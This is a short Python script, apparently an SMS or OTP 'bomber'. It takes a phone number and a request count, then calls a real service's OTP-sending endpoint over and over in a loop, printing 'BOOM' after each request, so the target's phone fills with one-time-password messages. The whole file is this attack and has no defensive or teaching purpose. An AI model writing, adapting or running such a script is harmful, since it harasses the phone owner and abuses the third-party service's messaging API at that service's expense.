import requests


# GET
number = str(input("Enter phone number: "))
amount = int(input("Enter amount of requests: "))

url = 'https://api.markaz.app/reseller/otp/send/+' + number + '/markaz'

for i in range(amount):
    response = requests.get(url)
    print(str(i+1)+" BOOM")